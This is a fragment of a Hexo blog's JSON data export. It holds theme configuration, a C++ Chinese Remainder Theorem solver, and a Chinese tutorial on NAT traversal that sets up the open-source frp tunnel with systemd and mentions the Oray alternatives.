tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":623,"excerpt":"<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h1><p>未完待续</p>\n<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><p>未完待续<br>","more":"</p>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> ll;</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\">ll yu[<span class=\"number\">120</span>],chu[<span class=\"number\">120</span>];</span><br><span class=\"line\"><span class=\"function\">ll <span class=\"title\">exgcd</span><span class=\"params\">(ll a,ll b,ll &amp;x,ll &amp;y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(b==<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        x=<span class=\"number\">1</span>,y=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> a;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ll res=exgcd(b,a%b,y,x);</span><br><span class=\"line\">        y-=x*(a/b);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">ll <span class=\"title\">china</span><span class=\"params\">(<span class=\"keyword\">int</span> l)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    ll d,x,y,m,n=<span class=\"number\">1</span>,ret=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;l;i++)</span><br><span class=\"line\">        n*=chu[i];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;l;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        m=n/chu[i];</span><br><span class=\"line\">        d=exgcd(chu[i],m,x,y);</span><br><span class=\"line\">        ret=(ret+y*m*yu[i])%n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (n+ret%n)%n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> N;</span><br><span class=\"line\">    <span class=\"built_in\">cin</span>&gt;&gt;N;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;N;i++)</span><br><span class=\"line\">        <span class=\"built_in\">cin</span>&gt;&gt;chu[i]&gt;&gt;yu[i];</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;china(N)&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"内网穿透","date":"2020-04-08T08:08:24.000Z","abbrlink":"bd50b816","_content":"# 名词解释\n&emsp;&emsp;**端口映射**就是将外网主机的IP地址的一个端口映射到内网中一台机器，提供相应的服务。当用户访问该IP的这个端口时，服务器自动将请求映射到对应局域网内部的机器上。端口映射有动态和静态之分。\n&emsp;&emsp;通俗来讲，端口映射是将一台主机的内网(LAN)IP地址映射成一个公网(WAN)IP地址，当用户访问提供映射端口主机的某个端口时，服务器将请求转移到本地局域网内部提供这种特定服务的主机；利用端口映射功能还可以将一台外网IP地址机器的多个端口映射到内网不同机器上的不同端口。 端口映射功能还可以完成一些特定代理功能，比如代理POP，SMTP，TELNET等协议。理论上可以提供65535(总端口数)-1024(保留端口数)=64511个端口的映射。\n\n&emsp;&emsp;**内网穿透**，即NAT穿透，网络连接时术语，计算机是局域网内时，外网与内网的计算机节点需要连接通信，有时就会出现不支持内网穿透。就是说映射端口，能让外网的电脑找到处于内网的电脑，提高下载速度。不管是内网穿透还是其他类型的网络穿透，都是网络穿透的统一方法来研究和解决。\n\n<!--more-->\n# 方式\n## FRP\n&emsp;&emsp;假如你有一个有公网IP的服务器，并且网速不是太差的话，frp就是一个不错的选择，当然如果没有的话，可以用后面的方法。\n\n### 下载frp\n> frp项目地址：https://github.com/fatedier/frp\n\n进入realses界面下载需要的版本，下载完成后分别解压到服务器和客户端上。\n这里以linux（服务器），windows(客户端)为例。\n\n### linux服务器上配置\n下载并解压文件。\n```bash\nwget https://github.com/fatedier/frp/releases/download/v0.29.0/frp_0.29.0_linux_amd64.tar.gz\ntar xzvf frp_0.29.0_linux_amd64.tar.gz\n# 可以给文件夹改个短点的名字\nmv frp_0.29.0_linux_amd64 frp\n```\n配置服务端frp配置文件。\n```bash\ncd frp\nvim frps.ini\n```\n按 $I$ 键进入插入模式，输入以下内容。\n```ini\n[common]\nbind_port = 7000  # 默认监听端口，为服务器和客户端通信的端口，可以根据实际情况进行更改。\ntoken = 12345678  # 认证秘钥，客户端需与服务端一致才可以连接，可以不写这一行。\n```\n按 $Esc$ 退出插入模式，并输入”:wq”保存（w）并退出（q），不包括引号。\n至此，服务端已配置完毕，接下来运行即可。\n```bash\n./frps -c frps.ini # 运行时需保持终端打开，否则会结束运行。Ctrl+C手动结束运行。\nnohup ./frps -c frps.ini # 放到后台运行，服务器重启需重新执行。\n```\n以上方式运行未免还是有些不方便，所以最好将其写入到systemd服务。\n```bash\nsudo vim /etc/systemd/system/frps.service\n```\n写入以下内容。\n```nohilight\n[Unit]\nDescription=frps daemon    # 服务名称，随便填写即可\nAfter=syslog.target  network.target\nWants=network.target\n\n[Service]\nType=simple\nExecStart=/root/frp/frps -c /root/frp/frps.ini   # 修改为你的frps的绝对路径\nRestart= always\nRestartSec=1min\n\n[Install]\nWantedBy=multi-user.target\n```\n启动服务，并设置开及自动运行。\n```bash\nsudo systemctl daemon-reload        # 重新加载服务\nsudo systemctl enable frps.service  # 开机自启\nsudo systemctl start frps           # 启动服务\n```\n### windows客户端上配置\n配置客户端frp配置文件，编辑 frpc.ini。\n```ini\n[common]\nserver_addr = 0.0.0.0  # 服务器IP地址或域名\nserver_port = 7000     # 服务器监听端口\ntoken = 12345678\n\n[mc]   # 此处名称随意\ntype = tcp  # 协议类型，如udp，http，https，stpx，xtcp\nlocal_port = 25565       # 本地监听端口\nremote_port = 25565      # 服务器转发端口\ncustom_domains = domain  # 服务器域名\n```\n至此，客户端也配置完毕了，进入到frp文件夹，在此处打开cmd，或powershell。\n```bash\n.\\frpc -c frpc.ini\n```\n运行以上内容即可，窗口关闭即结束，也可以写入到 run.bat 双击执行。\n接下来就可以愉快的玩耍了。\n\n**注：详细配置文件参照frps_full.ini和frpc_full.ini**\n\n## 其他方式\n### 花生壳\n\n> 官网：https://hsk.oray.com\n\n一次性付费开通服务，1Mbps带宽，每月1G流量。\n\n### 蒲公英\n\n> 官网：https://pgy.oray.com\n\n免费，仅限三人互相访问，1Mbps带宽。\n\n**还有其他免费平台自行百度即可，此处就不多赘述。**","source":"_posts/内网穿透.md","raw":"---\ntitle: 内网穿透\ndate: 2020-04-08 16:08:24\ncategories:\n  - 计算机网络\ntags: 端口映射\nabbrlink: bd50b816\n---\n# 名词解释\n&emsp;&emsp;**端口映射**就是将外网主机的IP地址的一个端口映射到内网中一台机器，提供相应的服务。当用户访问该IP的这个端口时，服务器自动将请求映射到对应局域网内部的机器上。端口映射有动态和静态之分。\n&emsp;&emsp;通俗来讲，端口映射是将一台主机的内网(LAN)IP地址映射成一个公网(WAN)IP地址，当用户访问提供映射端口主机的某个端口时，服务器将请求转移到本地局域网内部提供这种特定服务的主机；利用端口映射功能还可以将一台外网IP地址机器的多个端口映射到内网不同机器上的不同端口。 端口映射功能还可以完成一些特定代理功能，比如代理POP，SMTP，TELNET等协议。理论上可以提供65535(总端口数)-1024(保留端口数)=64511个端口的映射。\n\n&emsp;&emsp;**内网穿透**，即NAT穿透，网络连接时术语，计算机是局域网内时，外网与内网的计算机节点需要连接通信，有时就会出现不支持内网穿透。就是说映射端口，能让外网的电脑找到处于内网的电脑，提高下载速度。不管是内网穿透还是其他类型的网络穿透，都是网络穿透的统一方法来研究和解决。\n\n<!--more-->\n# 方式\n## FRP\n&emsp;&emsp;假如你有一个有公网IP的服务器，并且网速不是太差的话，frp就是一个不错的选择，当然如果没有的话，可以用后面的方法。\n\n### 下载frp\n> frp项目地址：https://github.com/fatedier/frp\n\n进入realses界面下载需要的版本，下载完成后分别解压到服务器和客户端上。\n这里以linux（服务器），windows(客户端)为例。\n\n### linux服务器上配置\n下载并解压文件。\n```bash\nwget https://github.com/fatedier/frp/releases/download/v0.29.0/frp_0.29.0_linux_amd64.tar.gz\ntar xzvf frp_0.29.0_linux_amd64.tar.gz\n# 可以给文件夹改个短点的名字\nmv frp_0.29.0_linux_amd64 frp\n```\n配置服务端frp配置文件。\n```bash\ncd frp\nvim frps.ini\n```\n按 $I$ 键进入插入模式，输入以下内容。\n```ini\n[common]\nbind_port = 7000  # 默认监听端口，为服务器和客户端通信的端口，可以根据实际情况进行更改。\ntoken = 12345678  # 认证秘钥，客户端需与服务端一致才可以连接，可以不写这一行。\n```\n按 $Esc$ 退出插入模式，并输入”:wq”保存（w）并退出（q），不包括引号。\n至此，服务端已配置完毕，接下来运行即可。\n```bash\n./frps -c frps.ini # 运行时需保持终端打开，否则会结束运行。Ctrl+C手动结束运行。\nnohup ./frps -c frps.ini # 放到后台运行，服务器重启需重新执行。\n```\n以上方式运行未免还是有些不方便，所以最好将其写入到systemd服务。\n```bash\nsudo vim /etc/systemd/system/frps.service\n```\n写入以下内容。\n```nohilight\n[Unit]\nDescription=frps daemon    # 服务名称，随便填写即可\nAfter=syslog.target  network.target\nWants=network.target\n\n[Service]\nType=simple\nExecStart=/root/frp/frps -c /root/frp/frps.ini   # 修改为你的frps的绝对路径\nRestart= always\nRestartSec=1min\n\n[Install]\nWantedBy=multi-user.target\n```\n启动服务，并设置开及自动运行。\n```bash\nsudo systemctl daemon-reload        # 重新加载服务\nsudo systemctl enable frps.service  # 开机自启\nsudo systemctl start frps           # 启动服务\n```\n### windows客户端上配置\n配置客户端frp配置文件，编辑 frpc.ini。\n```ini\n[common]\nserver_addr = 0.0.0.0  # 服务器IP地址或域名\nserver_port = 7000     # 服务器监听端口\ntoken = 12345678\n\n[mc]   # 此处名称随意\ntype = tcp  # 协议类型，如udp，http，https，stpx，xtcp\nlocal_port = 25565       # 本地监听端口\nremote_port = 25565      # 服务器转发端口\ncustom_domains = domain  # 服务器域名\n```\n至此，客户端也配置完毕了，进入到frp文件夹，在此处打开cmd，或powershell。\n```bash\n.\\frpc -c frpc.ini\n```\n运行以上内容即可，窗口关闭即结束，也可以写入到 run.bat 双击执行。\n接下来就可以愉快的玩耍了。\n\n**注：详细配置文件参照frps_full.ini和frpc_full.ini**\n\n## 其他方式\n### 花生壳\n\n> 官网：https://hsk.oray.com\n\n一次性付费开通服务，1Mbps带宽，每月1G流量。\n\n### 蒲公英\n\n> 官网：https://pgy.oray.com\n\n免费，仅限三人互相访问，1Mbps带宽。\n\n**还有其他免费平台自行百度即可，此处就不多赘述。**","slug":"内网穿透","published":1,"updated":"2020-05-11T09:45:20.552Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkc1002vqse59sly0t4t","content":"<h1 id=\"名词解释\"><a href=\"#名词解释\" class=\"headerlink\" title=\"名词解释\"></a>名词解释</h1><p>&emsp;&emsp;<strong>端口映射</strong>就是将外网主机的IP地址的一个端口映射到内网中一台机器，提供相应的服务。当用户访问该IP的这个端口时，服务器自动将请求映射到对应局域网内部的机器上。端口映射有动态和静态之分。<br>&emsp;&emsp;通俗来讲，端口映射是将一台主机的内网(LAN)IP地址映射成一个公网(WAN)IP地址，当用户访问提供映射端口主机的某个端口时，服务器将请求转移到本地局域网内部提供这种特定服务的主机；利用端口映射功能还可以将一台外网IP地址机器的多个端口映射到内网不同机器上的不同端口。 端口映射功能还可以完成一些特定代理功能，比如代理POP，SMTP，TELNET等协议。理论上可以提供65535(总端口数)-1024(保留端口数)=64511个端口的映射。</p>\n<p>&emsp;&emsp;<strong>内网穿透</strong>，即NAT穿透，网络连接时术语，计算机是局域网内时，外网与内网的计算机节点需要连接通信，有时就会出现不支持内网穿透。就是说映射端口，能让外网的电脑找到处于内网的电脑，提高下载速度。不管是内网穿透还是其他类型的网络穿透，都是网络穿透的统一方法来研究和解决。</p>\n<a id=\"more\"></a>\n<h1 id=\"方式\"><a href=\"#方式\" class=\"headerlink\" title=\"方式\"></a>方式</h1><h2 id=\"FRP\"><a href=\"#FRP\" class=\"headerlink\" title=\"FRP\"></a>FRP</h2><p>&emsp;&emsp;假如你有一个有公网IP的服务器，并且网速不是太差的话，frp就是一个不错的选择，当然如果没有的话，可以用后面的方法。</p>\n<h3 id=\"下载frp\"><a href=\"#下载frp\" class=\"headerlink\" title=\"下载frp\"></a>下载frp</h3><blockquote>\n<p>frp项目地址：<a href=\"https://github.com/fatedier/frp\">https://github.com/fatedier/frp</a></p>\n</blockquote>\n<p>进入realses界面下载需要的版本，下载完成后分别解压到服务器和客户端上。<br>这里以linux（服务器），windows(客户端)为例。</p>\n<h3 id=\"linux服务器上配置\"><a href=\"#linux服务器上配置\" class=\"headerlink\" title=\"linux服务器上配置\"></a>linux服务器上配置</h3><p>下载并解压文件。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://github.com/fatedier/frp/releases/download/v0.29.0/frp_0.29.0_linux_amd64.tar.gz</span><br><span class=\"line\">tar xzvf frp_0.29.0_linux_amd64.tar.gz</span><br><span class=\"line\"><span class=\"comment\"># 可以给文件夹改个短点的名字</span></span><br><span class=\"line\">mv frp_0.29.0_linux_amd64 frp</span><br></pre></td></tr></table></figure><br>配置服务端frp配置文件。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> frp</span><br><span class=\"line\">vim frps.ini</span><br></pre></td></tr></table></figure><br>按 $I$ 键进入插入模式，输入以下内容。<br><figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[common]</span></span><br><span class=\"line\"><span class=\"attr\">bind_port</span> = <span class=\"number\">7000</span>  <span class=\"comment\"># 默认监听端口，为服务器和客户端通信的端口，可以根据实际情况进行更改。</span></span><br><span class=\"line\"><span class=\"attr\">token</span> = <span class=\"number\">12345678</span>  <span class=\"comment\"># 认证秘钥，客户端需与服务端一致才可以连接，可以不写这一行。</span></span><br></pre></td></tr></table></figure><br>按 $Esc$ 退出插入模式，并输入”:wq”保存（w）并退出（q），不包括引号。<br>至此，服务端已配置完毕，接下来运行即可。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./frps -c frps.ini <span class=\"comment\"># 运行时需保持终端打开，否则会结束运行。Ctrl+C手动结束运行。</span></span><br><span class=\"line\">nohup ./frps -c frps.ini <span class=\"comment\"># 放到后台运行，服务器重启需重新执行。</span></span><br></pre></td></tr></table></figure><br>以上方式运行未免还是有些不方便，所以最好将其写入到systemd服务。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/systemd/system/frps.service</span><br></pre></td></tr></table></figure><br>写入以下内容。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description&#x3D;frps daemon    # 服务名称，随便填写即可</span><br><span class=\"line\">After&#x3D;syslog.target  network.target</span><br><span class=\"line\">Wants&#x3D;network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type&#x3D;simple</span><br><span class=\"line\">ExecStart&#x3D;&#x2F;root&#x2F;frp&#x2F;frps -c &#x2F;root&#x2F;frp&#x2F;frps.ini   # 修改为你的frps的绝对路径</span><br><span class=\"line\">Restart&#x3D; always</span><br><span class=\"line\">RestartSec&#x3D;1min</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure><br>启动服务，并设置开及自动运行。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo systemctl daemon-reload        <span class=\"comment\"># 重新加载服务</span></span><br><span class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> frps.service  <span class=\"comment\"># 开机自启</span></span><br><span class=\"line\">sudo systemctl start frps           <span class=\"comment\"># 启动服务</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"windows客户端上配置\"><a href=\"#windows客户端上配置\" class=\"headerlink\" title=\"windows客户端上配置\"></a>windows客户端上配置</h3><p>配置客户端frp配置文件，编辑 frpc.ini。<br><figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[common]</span></span><br><span class=\"line\"><span class=\"attr\">server_addr</span> = <span class=\"number\">0.0</span>.<span class=\"number\">0.0</span>  <span class=\"comment\"># 服务器IP地址或域名</span></span><br><span class=\"line\"><span class=\"attr\">server_port</span> = <span class=\"number\">7000</span>     <span class=\"comment\"># 服务器监听端口</span></span><br><span class=\"line\"><span class=\"attr\">token</span> = <span class=\"number\">12345678</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[mc]</span>   <span class=\"comment\"># 此处名称随意</span></span><br><span class=\"line\"><span class=\"attr\">type</span> = tcp  <span class=\"comment\"># 协议类型，如udp，http，https，stpx，xtcp</span></span><br><span class=\"line\"><span class=\"attr\">local_port</span> = <span class=\"number\">25565</span>       <span class=\"comment\"># 本地监听端口</span></span><br><span class=\"line\"><span class=\"attr\">remote_port</span> = <span class=\"number\">25565</span>      <span class=\"comment\"># 服务器转发端口</span></span><br><span class=\"line\"><span class=\"attr\">custom_domains</span> = domain  <span class=\"comment\"># 服务器域名</span></span><br></pre></td></tr></table></figure><br>至此，客户端也配置完毕了，进入到frp文件夹，在此处打开cmd，或powershell。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\frpc -c frpc.ini</span><br></pre></td></tr></table></figure><br>运行以上内容即可，窗口关闭即结束，也可以写入到 run.bat 双击执行。<br>接下来就可以愉快的玩耍了。</p>\n<p><strong>注：详细配置文件参照frps_full.ini和frpc_full.ini</strong></p>\n<h2 id=\"其他方式\"><a href=\"#其他方式\" class=\"headerlink\" title=\"其他方式\"></a>其他方式</h2><h3 id=\"花生壳\"><a href=\"#花生壳\" class=\"headerlink\" title=\"花生壳\"></a>花生壳</h3><blockquote>\n<p>官网：<a href=\"https://hsk.oray.com\">https://hsk.oray.com</a></p>\n</blockquote>\n<p>一次性付费开通服务，1Mbps带宽，每月1G流量。</p>\n<h3 id=\"蒲公英\"><a href=\"#蒲公英\" class=\"headerlink\" title=\"蒲公英\"></a>蒲公英</h3><blockquote>\n<p>官网：<a href=\"https://pgy.oray.com\">https://pgy.oray.com</a></p>\n</blockquote>\n<p>免费，仅限三人互相访问，1Mbps带宽。</p>\n<p><strong>还有其他免费平台自行百度即可，此处就不多赘述。</strong></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 